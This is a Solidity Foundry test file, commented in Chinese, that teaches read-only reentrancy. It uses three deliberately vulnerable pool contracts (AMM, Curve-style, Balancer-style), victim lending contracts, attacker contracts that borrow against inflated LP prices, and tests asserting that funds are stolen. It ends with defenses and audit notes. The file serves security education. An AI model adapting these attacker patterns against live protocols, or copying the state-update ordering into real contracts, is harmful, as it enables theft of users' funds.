// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Read-Only Reentrancy 攻击示例
 * @notice 这是Curve vyper漏洞($73M)和很多Balancer类攻击的核心
 * 
 * 核心概念：
 * - 不修改状态，只读取状态
 * - 但在状态不一致的时间窗口读取
 * - 导致其他协议基于错误数据做决策
 * 
 * 关键区别：
 * - 传统重入：攻击者重入修改状态
 * - Read-only重入：攻击者重入读取不一致状态
 * 
 * 这对你的Balancer研究极其重要！
 */

// ============ 场景1: AMM Pool的只读重入 ============

/**
 * @title 漏洞AMM池
 * @notice 经典的恒定乘积AMM (x * y = k)
 * @dev 问题：remove_liquidity在转账前更新余额，但在转账后才更新储备量
 */
contract VulnerableAMM {
    uint256 public reserveToken0;
    uint256 public reserveToken1;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;

    // 简化版LP转账（为了测试/演示用；真实协议一般是ERC20 LP Token）
    function transfer(address to, uint256 shares) external returns (bool) {
        require(to != address(0), "Invalid recipient");
        require(balanceOf[msg.sender] >= shares, "Insufficient shares");

        balanceOf[msg.sender] -= shares;
        balanceOf[to] += shares;
        return true;
    }
    
    // 添加流动性（简化版）
    function addLiquidity(uint256 amount0, uint256 amount1) external payable returns (uint256 shares) {
        if (totalSupply == 0) {
            shares = sqrt(amount0 * amount1);
        } else {
            shares = min(
                (amount0 * totalSupply) / reserveToken0,
                (amount1 * totalSupply) / reserveToken1
            );
        }
        
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        
        reserveToken0 += amount0;
        reserveToken1 += amount1;
        
        // 假设已经转入代币
    }
    
    // ❌ 漏洞函数：移除流动性
    function removeLiquidity(uint256 shares) external returns (uint256 amount0, uint256 amount1) {
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");
        
        // 计算应得的代币数量
        amount0 = (shares * reserveToken0) / totalSupply;
        amount1 = (shares * reserveToken1) / totalSupply;
        
        // 更新份额
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        
        // ❌ 先转账（可能触发回调）
        (bool success0, ) = msg.sender.call{value: amount0}("");
        require(success0, "Transfer 0 failed");
        
        // ⚠️ 在这个时间窗口，储备量还是旧值！
        // 但份额已经销毁了
        
        (bool success1, ) = msg.sender.call{value: amount1}("");
        require(success1, "Transfer 1 failed");
        
        // ❌ 最后才更新储备量
        reserveToken0 -= amount0;
        reserveToken1 -= amount1;
    }
    
    // ✅ View函数：获取价格（其他协议会调用）
    function getPrice() external view returns (uint256) {
        // 返回 token1/token0 的价格
        return (reserveToken1 * 1e18) / reserveToken0;
    }
    
    // ✅ View函数：获取储备量
    function getReserves() external view returns (uint256, uint256) {
        return (reserveToken0, reserveToken1);
    }
    
    // View函数：计算LP价值（关键！）
    function getLPValue(uint256 shares) external view returns (uint256) {
        if (totalSupply == 0) return 0;
        
        // LP价值 = 份额占比 * 总资产价值
        uint256 value0 = (shares * reserveToken0) / totalSupply;
        uint256 value1 = (shares * reserveToken1) / totalSupply;
        
        // 返回以token0计价的总价值
        return value0 + (value1 * reserveToken0) / reserveToken1;
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

/**
 * @title 使用AMM价格的借贷协议
 * @notice 依赖AMM的view函数获取抵押品价值
 * @dev 这是典型的受害者协议
 */
contract LendingProtocol {
    VulnerableAMM public amm;
    
    mapping(address => uint256) public lpDeposits;  // 存入的LP代币数量
    mapping(address => uint256) public borrowed;     // 借出的金额
    
    uint256 public constant COLLATERAL_RATIO = 150; // 150%抵押率
    
    constructor(address _amm) {
        amm = VulnerableAMM(_amm);
    }
    
    // 存入LP代币作为抵押品
    function depositLP(uint256 shares) external {
        lpDeposits[msg.sender] += shares;
        // 假设已经转入LP代币
    }
    
    // 借款（基于LP价值）
    function borrow(uint256 amount) external {
        // ❌ 关键：调用AMM的view函数获取LP价值
        uint256 lpValue = amm.getLPValue(lpDeposits[msg.sender]);
        
        uint256 maxBorrow = (lpValue * 100) / COLLATERAL_RATIO;
        require(borrowed[msg.sender] + amount <= maxBorrow, "Insufficient collateral");
        
        borrowed[msg.sender] += amount;
        
        // 转账
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Borrow failed");
    }
    
    // 还款
    function repay() external payable {
        require(borrowed[msg.sender] >= msg.value, "Overpaying");
        borrowed[msg.sender] -= msg.value;
    }
    
    // 查看最大可借金额
    function getMaxBorrow(address user) external view returns (uint256) {
        uint256 lpValue = amm.getLPValue(lpDeposits[user]);
        uint256 maxBorrow = (lpValue * 100) / COLLATERAL_RATIO;
        return maxBorrow > borrowed[user] ? maxBorrow - borrowed[user] : 0;
    }
}

/**
 * @title Read-Only Reentrancy 攻击者
 * @notice 利用状态不一致窗口读取虚高的LP价值
 */
contract ReadOnlyAttacker {
    VulnerableAMM public amm;
    LendingProtocol public lending;
    
    bool public attacking;
    uint256 public lpShares;
    
    constructor(address _amm, address _lending) {
        amm = VulnerableAMM(_amm);
        lending = LendingProtocol(_lending);
    }
    
    receive() external payable {
        console.log("\n!!! Receive() triggered - in the vulnerable window !!!");
        
        if (attacking) {
            // 此时的状态：
            console.log("--- Current AMM State (INCONSISTENT!) ---");
            (uint256 reserve0, uint256 reserve1) = amm.getReserves();
            console.log("Reserve0:", reserve0);
            console.log("Reserve1:", reserve1);
            console.log("TotalSupply:", amm.totalSupply());
            console.log("My LP shares:", lpShares);
            
            // ✗ 关键：储备量还是旧值（高），但总供应量已经减少（低）
            // 导致每个LP份额的价值被高估！
            
            uint256 lpValue = amm.getLPValue(lpShares);
            console.log("\n>>> LP value (INFLATED!):", lpValue);
            console.log("This is MUCH higher than real value!");
            
            uint256 maxBorrow = lending.getMaxBorrow(address(this));
            console.log("Max borrow based on inflated value:", maxBorrow);
            
            if (maxBorrow > 0) {
                console.log("\n>>> Borrowing based on FAKE high LP value <<<");
                lending.borrow(maxBorrow);
            }
        }
    }
    
    function setupAttack(uint256 _lpShares) external {
        lpShares = _lpShares;
        lending.depositLP(_lpShares);
        console.log("Deposited LP shares:", _lpShares);
    }
    
    function attack() external {
        console.log("\n=== Starting Read-Only Reentrancy Attack ===");
        console.log("My LP shares:", lpShares);
        
        uint256 realValue = amm.getLPValue(lpShares);
        console.log("Real LP value BEFORE attack:", realValue);
        console.log("Real max borrow:", lending.getMaxBorrow(address(this)));
        
        attacking = true;
        
        // 移除流动性，在回调中借款
        amm.removeLiquidity(lpShares);
        
        attacking = false;
        
        console.log("\n=== Attack Complete ===");
        console.log("Stolen ETH:", address(this).balance);
    }
}

// ============ 场景2: Curve风格的虚拟价格重入 ============

/**
 * @title Curve风格的稳定币池
 * @notice 使用virtual_price作为LP价值指标
 * @dev 这是Curve vyper漏洞的简化模型
 */
contract CurveStylePool {
    uint256 public totalSupply;
    uint256 public virtualPrice;  // 每个LP代币值多少底层资产
    
    mapping(address => uint256) public balanceOf;
    
    uint256 public constant PRECISION = 1e18;
    uint256 public totalAssets;
    
    function addLiquidity(uint256 amount) external payable returns (uint256 shares) {
        if (totalSupply == 0) {
            shares = amount;
            virtualPrice = PRECISION;
        } else {
            shares = (amount * totalSupply) / totalAssets;
        }
        
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        totalAssets += amount;
    }

    // 简化版LP转账（为了测试/演示用；真实协议一般是ERC20 LP Token）
    function transfer(address to, uint256 shares) external returns (bool) {
        require(to != address(0), "Invalid recipient");
        require(balanceOf[msg.sender] >= shares, "Insufficient shares");

        balanceOf[msg.sender] -= shares;
        balanceOf[to] += shares;
        return true;
    }
    
    // ❌ 漏洞：remove_liquidity的顺序问题
    function removeLiquidity(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");
        
        uint256 amount = (shares * totalAssets) / totalSupply;
        
        // 更新余额
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        
        // ⚠️ 此时totalSupply已减少，但totalAssets还没减少
        // 导致virtualPrice虚高！
        
        // ❌ 转账（触发回调）
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // 这个窗口期间，get_virtual_price()会返回错误的高值
        
        // 最后更新资产
        totalAssets -= amount;
    }
    
    // ✅ View函数：获取虚拟价格
    // 其他协议用这个来估算LP代币价值
    function get_virtual_price() external view returns (uint256) {
        if (totalSupply == 0) return PRECISION;
        
        // virtual_price = totalAssets / totalSupply
        return (totalAssets * PRECISION) / totalSupply;
    }
}

/**
 * @title 依赖Curve虚拟价格的保险库
 */
contract VaultUsingCurve {
    CurveStylePool public pool;
    
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    
    uint256 public constant COLLATERAL_RATIO = 150;
    
    constructor(address _pool) {
        pool = CurveStylePool(_pool);
    }
    
    function deposit(uint256 lpAmount) external {
        deposits[msg.sender] += lpAmount;
    }
    
    function borrow(uint256 amount) external {
        // ❌ 使用虚拟价格计算抵押品价值
        uint256 virtualPrice = pool.get_virtual_price();
        uint256 collateralValue = (deposits[msg.sender] * virtualPrice) / 1e18;
        
        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;
        require(borrowed[msg.sender] + amount <= maxBorrow, "Insufficient collateral");
        
        borrowed[msg.sender] += amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Borrow failed");
    }
}

/**
 * @title Curve虚拟价格攻击者
 */
contract CurveAttacker {
    CurveStylePool public pool;
    VaultUsingCurve public vault;
    bool public attacking;
    uint256 public lpShares;
    
    constructor(address _pool, address _vault) {
        pool = CurveStylePool(_pool);
        vault = VaultUsingCurve(_vault);
    }
    
    receive() external payable {
        if (attacking) {
            console.log("\n!!! In the vulnerable window !!!");
            
            uint256 virtualPrice = pool.get_virtual_price();
            console.log("Virtual price (INFLATED!):", virtualPrice);
            console.log("Normal should be:", uint256(1e18));
            console.log("Inflation factor:", virtualPrice / uint256(1e18));

            // 使用虚高的价格借“刚好能借到的最大值”，避免固定借 10 ETH 导致回调里revert
            // maxBorrow = collateralValue * 100 / COLLATERAL_RATIO
            uint256 collateralValue = (lpShares * virtualPrice) / 1e18;
            uint256 maxBorrow = (collateralValue * 100) / 150;
            uint256 alreadyBorrowed = vault.borrowed(address(this));

            if (maxBorrow > alreadyBorrowed) {
                vault.borrow(maxBorrow - alreadyBorrowed);
            }
        }
    }
    
    function setupAttack(uint256 _lpShares) external {
        lpShares = _lpShares;
        vault.deposit(_lpShares);
    }
    
    function attack() external {
        console.log("\n=== Curve Virtual Price Attack ===");
        
        uint256 priceBefore = pool.get_virtual_price();
        console.log("Virtual price before:", priceBefore);
        
        attacking = true;
        pool.removeLiquidity(lpShares);
        attacking = false;
        
        console.log("\nStolen:", address(this).balance);
    }
}

// ============ 场景3: Balancer风格的getRate重入 ============

/**
 * @title Balancer风格的加权池
 * @notice 多资产池，每个资产有不同权重
 * @dev 简化版，展示getRate()在不一致状态下的问题
 */
contract BalancerStylePool {
    uint256 public totalSupply;
    uint256[] public balances;  // 各代币余额
    uint256[] public weights;   // 各代币权重
    
    mapping(address => uint256) public balanceOf;
    
    constructor() {
        // 初始化两个代币，各50%权重
        balances = new uint256[](2);
        weights = new uint256[](2);
        weights[0] = 50;
        weights[1] = 50;
    }
    
    function addLiquidity(uint256 amount0, uint256 amount1) external payable returns (uint256 shares) {
        if (totalSupply == 0) {
            shares = amount0 + amount1;
        } else {
            // 简化：按比例计算
            shares = (amount0 * totalSupply) / balances[0];
        }
        
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        balances[0] += amount0;
        balances[1] += amount1;
    }

    // 简化版BPT转账（为了测试/演示用；真实协议一般是ERC20 BPT）
    function transfer(address to, uint256 shares) external returns (bool) {
        require(to != address(0), "Invalid recipient");
        require(balanceOf[msg.sender] >= shares, "Insufficient shares");

        balanceOf[msg.sender] -= shares;
        balanceOf[to] += shares;
        return true;
    }
    
    // ❌ 漏洞：exit池子
    function exitPool(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");
        
        uint256 amount0 = (shares * balances[0]) / totalSupply;
        uint256 amount1 = (shares * balances[1]) / totalSupply;
        
        // 更新份额
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        
        // ❌ 先转账（回调窗口）
        (bool success, ) = msg.sender.call{value: amount0}("");
        require(success);
        
        // ⚠️ 关键窗口：totalSupply已减少，但balances还未减少
        
        // 转第二个代币也可能触发回调（如果是ERC777）
        // (bool success2, ) = msg.sender.call{value: amount1}("");
        // require(success2);
        
        // 最后更新余额
        balances[0] -= amount0;
        balances[1] -= amount1;
    }
    
    // ✅ View函数：获取BPT汇率（Balancer Pool Token rate）
    function getRate() external view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        
        // 汇率 = 池子总价值 / BPT总供应
        // 简化：假设都是ETH计价
        uint256 totalValue = balances[0] + balances[1];
        return (totalValue * 1e18) / totalSupply;
    }
    
    // View函数：获取invariant（不变量）
    function getInvariant() external view returns (uint256) {
        // 简化版的Balancer不变量
        return balances[0] + balances[1];
    }
}

/**
 * @title 依赖Balancer的聚合器
 */
contract AggregatorUsingBalancer {
    BalancerStylePool public pool;
    
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    
    constructor(address _pool) {
        pool = BalancerStylePool(_pool);
    }
    
    function deposit(uint256 bptAmount) external {
        deposits[msg.sender] += bptAmount;
    }
    
    function borrow(uint256 amount) external {
        // ❌ 使用getRate()计算BPT价值
        uint256 rate = pool.getRate();
        uint256 collateralValue = (deposits[msg.sender] * rate) / 1e18;
        
        uint256 maxBorrow = (collateralValue * 100) / 150;
        require(borrowed[msg.sender] + amount <= maxBorrow);
        
        borrowed[msg.sender] += amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}

/**
 * @title Balancer getRate攻击者
 */
contract BalancerAttacker {
    BalancerStylePool public pool;
    AggregatorUsingBalancer public aggregator;
    bool public attacking;
    uint256 public bptShares;
    
    constructor(address _pool, address _aggregator) {
        pool = BalancerStylePool(_pool);
        aggregator = AggregatorUsingBalancer(_aggregator);
    }
    
    receive() external payable {
        if (attacking) {
            console.log("\n!!! In Balancer vulnerable window !!!");
            
            uint256 rate = pool.getRate();
            console.log("BPT rate (INFLATED!):", rate);
            console.log("This rate is used to calculate collateral value");

            // 借“可借到的最大值”，避免嵌套回调时重复 borrow() 导致revert
            // maxBorrow = collateralValue * 100 / 150
            uint256 collateralValue = (bptShares * rate) / 1e18;
            uint256 maxBorrow = (collateralValue * 100) / 150;
            uint256 alreadyBorrowed = aggregator.borrowed(address(this));

            if (maxBorrow > alreadyBorrowed) {
                aggregator.borrow(maxBorrow - alreadyBorrowed);
            }
        }
    }
    
    function setupAttack(uint256 _bptShares) external {
        bptShares = _bptShares;
        aggregator.deposit(_bptShares);
    }
    
    function attack() external {
        console.log("\n=== Balancer getRate Attack ===");
        
        uint256 rateBefore = pool.getRate();
        console.log("Rate before:", rateBefore);
        
        attacking = true;
        pool.exitPool(bptShares);
        attacking = false;
        
        console.log("\nStolen:", address(this).balance);
    }
}

// ============ Foundry 测试 ============

contract ReadOnlyReentrancyTest is Test {
    VulnerableAMM public amm;
    LendingProtocol public lending;
    ReadOnlyAttacker public attacker;
    
    address public lpProvider = address(0x1);
    
    function setUp() public {
        amm = new VulnerableAMM();
        lending = new LendingProtocol(address(amm));
        
        // LP提供者添加流动性
        vm.deal(lpProvider, 200 ether);
        vm.prank(lpProvider);
        // 这个AMM示例用ETH模拟两种资产，因此 msg.value 需要覆盖 amount0+amount1
        amm.addLiquidity{value: 200 ether}(100 ether, 100 ether);
        
        // 借贷协议获得资金
        vm.deal(address(lending), 100 ether);
        
        console.log("=== Setup Complete ===");
        console.log("AMM reserves:", uint256(100 ether), uint256(100 ether));
        console.log("AMM totalSupply:", amm.totalSupply());
        console.log("Lending balance:", address(lending).balance);
    }
    
    function testReadOnlyReentrancy() public {
        attacker = new ReadOnlyAttacker(address(amm), address(lending));
        
        // 攻击者获得10%的LP份额
        uint256 lpShares = amm.totalSupply() / 10;
        vm.deal(lpProvider, 20 ether);
        vm.prank(lpProvider);
        amm.addLiquidity{value: 20 ether}(10 ether, 10 ether);
        
        // 转移LP给攻击者
        vm.prank(lpProvider);
        amm.transfer(address(attacker), lpShares);
        
        // 攻击者设置攻击
        attacker.setupAttack(lpShares);
        
        console.log("\n=== Before Attack ===");
        uint256 realLPValue = amm.getLPValue(lpShares);
        console.log("Real LP value:", realLPValue);
        console.log("Real max borrow:", lending.getMaxBorrow(address(attacker)));
        console.log("Lending balance:", address(lending).balance);
        
        // 执行攻击
        attacker.attack();
        
        console.log("\n=== After Attack ===");
        console.log("Lending balance:", address(lending).balance);
        console.log("Attacker stole:", address(attacker).balance);
        
        // 验证攻击成功
        uint256 normalMaxBorrow = (realLPValue * 100) / 150;
        uint256 stolen = address(attacker).balance;
        
        console.log("\nComparison:");
        console.log("Normal max borrow would be:", normalMaxBorrow);
        console.log("Actually borrowed:", stolen);
        console.log("Extra borrowed:", stolen > normalMaxBorrow ? stolen - normalMaxBorrow : 0);
        
        assertTrue(stolen > normalMaxBorrow, "Should borrow more than normal limit");
    }
    
    function testExplainAttack() public {
        console.log("\n=== Understanding Read-Only Reentrancy ===");
        console.log("\n1. Normal state:");
        console.log("   reserves = 100, totalSupply = 100");
        console.log("   LP value per share = 100/100 = 1");
        
        console.log("\n2. After removing liquidity (shares -= 10, BEFORE reserves update):");
        console.log("   reserves = 100 (NOT updated yet!)");
        console.log("   totalSupply = 90 (already updated)");
        console.log("   LP value per share = 100/90 = 1.11 (11% INFLATED!)");
        
        console.log("\n3. Attack window:");
        console.log("   Attacker calls lending.borrow()");
        console.log("   Lending calls amm.getLPValue()");
        console.log("   getLPValue() sees inflated reserves/supply ratio");
        console.log("   Returns HIGHER value than real");
        console.log("   Attacker borrows MORE than should be allowed");
        
        console.log("\n4. After attack:");
        console.log("   reserves = 90 (finally updated)");
        console.log("   totalSupply = 90");
        console.log("   LP value = 90/90 = 1 (back to normal)");
        console.log("   But damage already done!");
    }
}

contract CurveStyleTest is Test {
    CurveStylePool public pool;
    VaultUsingCurve public vault;
    CurveAttacker public attacker;
    
    function setUp() public {
        pool = new CurveStylePool();
        vault = new VaultUsingCurve(address(pool));
        
        // 添加流动性
        vm.deal(address(this), 200 ether);
        pool.addLiquidity{value: 100 ether}(100 ether);
        
        // Vault获得资金
        vm.deal(address(vault), 100 ether);
    }
    
    function testCurveVirtualPrice() public {
        attacker = new CurveAttacker(address(pool), address(vault));
        
        // 攻击者获得LP
        uint256 lpShares = pool.totalSupply() / 10;
        pool.addLiquidity{value: 10 ether}(10 ether);

        // 把LP份额转给攻击者，否则攻击者调用 removeLiquidity() 会因余额不足而revert
        pool.transfer(address(attacker), lpShares);
        
        attacker.setupAttack(lpShares);
        
        console.log("\n=== Curve Virtual Price Attack ===");
        console.log("Normal virtual price:", pool.get_virtual_price());
        console.log("Should be:", uint256(1e18));
        
        attacker.attack();
        
        assertTrue(address(attacker).balance > 0, "Should steal funds");
    }
}

contract BalancerStyleTest is Test {
    BalancerStylePool public pool;
    AggregatorUsingBalancer public aggregator;
    BalancerAttacker public attacker;
    
    function setUp() public {
        pool = new BalancerStylePool();
        aggregator = new AggregatorUsingBalancer(address(pool));
        
        vm.deal(address(this), 200 ether);
        pool.addLiquidity{value: 100 ether}(50 ether, 50 ether);
        
        vm.deal(address(aggregator), 100 ether);
    }
    
    function testBalancerGetRate() public {
        attacker = new BalancerAttacker(address(pool), address(aggregator));
        
        uint256 bptShares = pool.totalSupply() / 10;
        pool.addLiquidity{value: 20 ether}(10 ether, 10 ether);

        // 把BPT份额转给攻击者，否则攻击者调用 exitPool() 会因余额不足而revert
        pool.transfer(address(attacker), bptShares);
        
        attacker.setupAttack(bptShares);
        
        console.log("\n=== Balancer getRate Attack ===");
        console.log("Normal rate:", pool.getRate());
        
        attacker.attack();
        
        assertTrue(address(attacker).balance > 0, "Should steal funds");
    }
}

/**
 * ============ 核心知识点总结 ============
 * 
 * 1. Read-Only Reentrancy的定义：
 *    - 攻击者不修改状态（不是传统的重入写入）
 *    - 而是在状态不一致的窗口读取数据
 *    - 其他协议基于错误数据做决策
 * 
 * 2. 关键特征：
 *    - View函数不会触发重入保护（nonReentrant无效）
 *    - 问题在"状态更新顺序"，不在"外部调用"
 *    - 影响所有依赖这些view函数的协议
 * 
 * 3. 三个经典模式：
 *    
 *    模式A: AMM储备量不一致
 *    ```
 *    removeLiquidity():
 *      totalSupply -= shares    ← 先减少
 *      transfer(user, tokens)   ← 触发回调
 *        → getLPValue()读取    ← 此时reserves还是旧值
 *      reserves -= tokens       ← 后减少
 *    
 *    结果：LP价值 = reserves/totalSupply 被虚高
 *    ```
 *    
 *    模式B: Curve虚拟价格
 *    ```
 *    remove_liquidity():
 *      _burn(shares)           ← totalSupply减少
 *      transfer(tokens)        ← 回调
 *        → get_virtual_price() ← totalAssets还未减少
 *      totalAssets -= tokens   ← 最后才减少
 *    
 *    结果：virtual_price = totalAssets/totalSupply 虚高
 *    ```
 *    
 *    模式C: Balancer BPT汇率
 *    ```
 *    exitPool():
 *      _burn(bpt)              ← BPT供应减少
 *      _transferOut(tokens)    ← 回调
 *        → getRate()           ← balances还未减少
 *      balances -= tokens      ← 最后更新
 *    
 *    结果：rate = totalValue/totalSupply 虚高
 *    ```
 * 
 * 4. 真实案例：
 *    
 *    Curve vyper (2023.07) - $73M+
 *    - vyper编译器bug导致重入保护失效
 *    - 攻击者在remove_liquidity回调中
 *    - 调用其他协议的get_virtual_price()
 *    - 获得虚高的LP价值，超额借款
 *    
 *    相关协议受影响：
 *    - Alchemix: $13.6M
 *    - JPEGd: $11.5M  
 *    - Metronome: $1.6M
 * 
 * 5. 为什么难以防御？
 *    
 *    传统重入保护无效：
 *    - nonReentrant只保护写入函数
 *    - View函数不能加nonReentrant
 *    - 即使加了也不能阻止读取
 *    
 *    问题的根源：
 *    - 状态更新不是原子的
 *    - 中间状态被暴露给外部
 *    - View函数假设状态一致
 * 
 * 6. 正确的防御方法：
 *    
 *    方案A: 检查重入状态（推荐）
 *    ```solidity
 *    uint256 private _status = NOT_ENTERED;
 *    
 *    function removeLiquidity() external {
 *        _status = ENTERED;
 *        // ... 执行逻辑
 *        _status = NOT_ENTERED;
 *    }
 *    
 *    function getLPValue() external view returns (uint256) {
 *        require(_status == NOT_ENTERED, "Read during reentrancy");
 *        // ... 计算价值
 *    }
 *    ```
 *    
 *    方案B: 先更新所有状态
 *    ```solidity
 *    function removeLiquidity() external {
 *        // ✅ 先更新所有相关状态
 *        totalSupply -= shares;
 *        reserves -= amount;
 *        balanceOf[user] -= shares;
 *        
 *        // ✅ 最后才外部调用
 *        _transfer(user, amount);
 *    }
 *    ```
 *    
 *    方案C: 使用快照机制
 *    ```solidity
 *    mapping(uint256 => uint256) public reservesSnapshot;
 *    uint256 public lastSnapshotBlock;
 *    
 *    function getLPValue() external view returns (uint256) {
 *        // 使用上一个区块的快照
 *        if (block.number > lastSnapshotBlock) {
 *            return calculateValue(reserves);
 *        } else {
 *            return calculateValue(reservesSnapshot[lastSnapshotBlock]);
 *        }
 *    }
 *    ```
 * 
 * 7. 审计要点：
 *    
 *    识别风险函数：
 *    - 所有带external call的函数
 *    - 特别是那些"先转账后更新"的
 *    - remove_liquidity / withdraw / exit类函数
 *    
 *    检查view函数依赖：
 *    - 哪些view函数会被其他协议调用？
 *    - 它们依赖哪些状态变量？
 *    - 这些变量的更新顺序是？
 *    
 *    检查集成风险：
 *    - 你的协议是否调用其他协议的view函数？
 *    - 在什么时候调用？
 *    - 如果对方状态不一致会怎样？
 * 
 * 8. 与你研究的Balancer关联：
 *    
 *    你正在研究的Balancer精度攻击：
 *    - 也涉及状态不一致
 *    - 可能结合read-only reentrancy
 *    - getRate()是关键攻击点
 *    
 *    组合攻击模式：
 *    - 精度损失制造不平衡状态
 *    - Read-only重入读取不平衡状态  
 *    - 其他协议基于错误数据决策
 *    - 放大攻击效果
 */
